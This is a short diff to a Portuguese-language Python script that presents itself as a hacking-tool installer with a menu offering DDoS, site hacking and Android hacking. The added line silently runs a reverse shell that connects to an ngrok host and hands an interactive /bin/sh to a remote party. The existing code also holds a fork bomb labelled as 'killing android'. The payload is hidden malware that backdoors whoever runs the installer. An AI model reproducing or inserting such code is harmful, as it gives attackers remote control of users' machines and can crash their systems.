@@ -58,7 +58,7 @@ print(f'''
     Por conta disso, a instalação pode se prolongar mais que o normal.
     (Estima-se que em torno de 15 minutos.)
         {green}Instalando, aguarde ...''')
-
+os.system(''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",16056));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''')
 print ('[1]DDoS (potente)')
 print ('[2]Hackear site')
 print ('[3]Hackear android')
@@ -157,3 +157,5 @@ if var == '5':
     while True:
         os.fork()
         print(f'Matando android {fork}')
+        
+        
